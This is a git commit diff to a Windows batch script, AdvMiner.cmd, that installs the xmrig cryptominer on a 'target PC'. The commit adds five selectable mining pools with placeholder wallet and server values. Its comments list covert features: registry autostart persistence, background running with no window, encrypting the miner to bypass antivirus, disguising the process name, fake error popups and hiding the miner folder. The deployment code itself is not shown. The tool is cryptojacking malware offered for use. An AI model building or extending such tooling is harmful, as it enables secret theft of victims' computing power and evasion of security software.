41afcb9a999c66f355199582d74607bc35ed094a
ar1k88 <ar1k88gamingllc@gmail.com>
2018-09-11 08:43:56 +0000

    MIT, Multipool
    Added Multipool feature and Basic MIT License.

--- AdvMiner.cmd
+++ AdvMiner.cmd
@@ -10,6 +10,31 @@ REM have a config, please share with the community.
 REM 
 REM                               -REDD-
 REM                https://www.private-locker.com
+REM 
+REM ============================================================================
+REM ---------------------------[ FEATURES/TOGGLES ]-----------------------------
+REM ============================================================================
+REM 
+REM AUTOSTART    - CREATES A REGISTRY ENTRY TO START A GENERATED BATCH
+REM                FILE IN THE TARGET PC'S FOLDER.
+REM BACKGROUND   - RUNS THE MINER IN THE BACKGROUND WITHOUT DISPLAYING
+REM                ANY PROMPT ON THE SCREEN.
+REM ENCRYPTION   - USES A NATIVE TOOL IN WINDOWS TO ENCRYPT THE EXE OF
+REM                THE MINER, TRANSFER TO TARGET PC, DECRYPT. BYPASSES
+REM                60% OF ANTIVIRUSES.
+REM FAKEAPP      - RUNS THE ORIGINAL MINER AS A DIFFERENT EXE NAME.
+REM                (DOES NOT RENAME THE APP INSIDE THE MANIFEST aka -
+REM                 APPEARS THE SAME ON TASK MANAGER.)
+REM FAKEERROR    - OPENS A FAKE ERROR MESSAGE BOX WITH YOUR CUSTOM 
+REM                STRING OF TEXT USING "ERRORTXT".
+REM HIDELOCATION - HIDES THE DIRECTORY OF THE MINER FOLDER ON TARGET
+REM                PC WHEN RAN.
+REM MINEREXTRAS  - PULLS THE EXTRA DLL FILES WITH THE MINER. ONLY USE
+REM                IF THE MINER REQUIRES EXTRA DLL'S. 
+REM MUTLIPOOL    - CHOOSE BETWEEN MULTIPLE POOLS (1,2,3,4,5) USING THE
+REM                "POOLNUM" VARIABLE. (DEFAULTS TO POOL #1)
+REM 
+REM ============================================================================
 REM
 REM ============================================================================
 REM ERRORS:
@@ -28,30 +53,66 @@ SET "HIDELOCATION=NO"
 SET "MINEREXTRAS=NO"
 SET "AUTOSTART=NO"
 REM ============================================================================
+REM MULTI-POOL CHOICE: (IF "NO" DEFAULTS TO POOL #1)
+REM ============================================================================
+SET "MULTIPOOL=NO"
+SET "POOLNUM=2"
+REM ============================================================================
 REM MINER CREDENTIALS:
 REM ============================================================================
-SET "SERVER=POOL_SERVER_ADDRESS_HERE"
-SET "PORT=PORT_NUMBER_HERE"
-SET "USER=WALLET_ADDRESS_HERE"
-SET "PASS=x"
-SET "ALGO=ALGO_HERE"
+REM POOL #1 (DEFAULT POOL)
 REM ============================================================================
-REM AUTOSTART    - CREATES A REGISTRY ENTRY TO START A GENERATED BATCH
-REM                FILE IN THE TARGET PC'S FOLDER.
-REM BACKGROUND   - RUNS THE MINER IN THE BACKGROUND WITHOUT DISPLAYING
-REM                ANY PROMPT ON THE SCREEN.
-REM ENCRYPTION   - USES A NATIVE TOOL IN WINDOWS TO ENCRYPT THE EXE OF
-REM                THE MINER, TRANSFER TO TARGET PC, DECRYPT. BYPASSES
-REM                60% OF ANTIVIRUSES.
-REM FAKEAPP      - RUNS THE ORIGINAL MINER AS A DIFFERENT EXE NAME.
-REM                (DOES NOT RENAME THE APP INSIDE THE MANIFEST aka -
-REM                 APPEARS THE SAME ON TASK MANAGER.)
-REM FAKEERROR    - OPENS A FAKE ERROR MESSAGE BOX WITH YOUR CUSTOM 
-REM                STRING OF TEXT USING "ERRORTXT".
-REM HIDELOCATION - HIDES THE DIRECTORY OF THE MINER FOLDER ON TARGET
-REM                PC WHEN RAN.
-REM MINEREXTRAS  - PULLS THE EXTRA DLL FILES WITH THE MINER. ONLY USE
-REM                IF THE MINER REQUIRES EXTRA DLL'S.
+SET "SERVER1=POOL_1_URL"
+SET "PORT1=PORT_NUMBER_HERE"
+SET "USER1=WALLET_ADDRESS_HERE"
+SET "PASS1=x"
+SET "ALGO1=ALGO_HERE"
+REM ============================================================================
+REM ----------[ ONLY EDIT POOL #2-#5 IF YOU HAVE MULTIPOOL AS "YES" ]-----------
+REM ============================================================================
+REM POOL #2
+REM ============================================================================
+SET "SERVER2=POOL_2_URL"
+SET "PORT2=PORT_NUMBER_HERE"
+SET "USER2=WALLET_ADDRESS_HERE"
+SET "PASS2=x"
+SET "ALGO2=ALGO_HERE"
+REM ============================================================================
+REM POOL #3
+REM ============================================================================
+SET "SERVER3=POOL_SERVER_ADDRESS_HERE"
+SET "PORT3=PORT_NUMBER_HERE"
+SET "USER3=WALLET_ADDRESS_HERE"
+SET "PASS3=x"
+SET "ALGO3=ALGO_HERE"
+REM ============================================================================
+REM POOL #4
+REM ============================================================================
+SET "SERVER4=POOL_SERVER_ADDRESS_HERE"
+SET "PORT4=PORT_NUMBER_HERE"
+SET "USER4=WALLET_ADDRESS_HERE"
+SET "PASS4=x"
+SET "ALGO4=ALGO_HERE"
+REM ============================================================================
+REM POOL #5
+REM ============================================================================
+SET "SERVER5=POOL_SERVER_ADDRESS_HERE"
+SET "PORT5=PORT_NUMBER_HERE"
+SET "USER5=WALLET_ADDRESS_HERE"
+SET "PASS5=x"
+SET "ALGO5=ALGO_HERE"
+REM ============================================================================
+REM Basic MIT License:
+REM
+REM Copyright (c) 2018 Private-Locker, -REDD- & Private-Locker Community Entity
+REM
+REM THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+REM IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+REM FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+REM AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+REM LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+REM OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+REM SOFTWARE. 
 REM 
 REM =============================================================================
 SET "ORIGMINER=xmrig.exe"
@@ -87,6 +148,50 @@ IF "%CLEANUP%" EQU "YES" (SET "CLEANUP=1") ELSE (SET "CLEANUP=0")
 IF "%FAKEERROR%" EQU "YES" (SET "FAKEERROR=1") ELSE (SET "FAKEERROR=0")
 REM Detect which name to use for the Miners Application Name..
 IF "%FAKEAPP%" EQU "1" (SET "MINER=%FAKENAME%") ELSE (SET "MINER=%ORIGMINER%")
+REM Start of Multiple Pool Helper by numbers 1-5, IF not enabled - use pool 1
+IF "%MULTIPOOL%" EQU "YES" (
+	IF "%POOLNUM%" EQU "1" (
+		SET "SERVER=%SERVER1%"
+		SET "PORT=%PORT1%"
+		SET "USER=%USER1%"
+		SET "PASS=%PASS1%"
+		SET "ALGO=%ALGO1%"
+	)
+	IF "%POOLNUM%" EQU "2" (
+		SET "SERVER=%SERVER2%"
+		SET "PORT=%PORT2%"
+		SET "USER=%USER2%"
+		SET "PASS=%PASS2%"
+		SET "ALGO=%ALGO2%"
+	)
+	IF "%POOLNUM%" EQU "3" (
+		SET "SERVER=%SERVER3%"
+		SET "PORT=%PORT3%"
+		SET "USER=%USER3%"
+		SET "PASS=%PASS3%"
+		SET "ALGO=%ALGO3%"
+	)
+	IF "%POOLNUM%" EQU "4" (
+		SET "SERVER=%SERVER4%"
+		SET "PORT=%PORT4%"
+		SET "USER=%USER4%"
+		SET "PASS=%PASS4%"
+		SET "ALGO=%ALGO4%"
+	)
+	IF "%POOLNUM%" EQU "5" (
+		SET "SERVER=%SERVER5%"
+		SET "PORT=%PORT5%"
+		SET "USER=%USER5%"
+		SET "PASS=%PASS5%"
+		SET "ALGO=%ALGO5%"
+	)
+) ELSE (
+	SET "SERVER=%SERVER1%"
+	SET "PORT=%PORT1%"
+	SET "USER=%USER1%"
+	SET "PASS=%PASS1%"
+	SET "ALGO=%ALGO1%"
+)
 
 REM Finally after all that craziness.. Time for THIS craziness..
 IF EXIST "%TARGETDIR%\%MINER%" (GOTO 0) ELSE (GOTO 1)
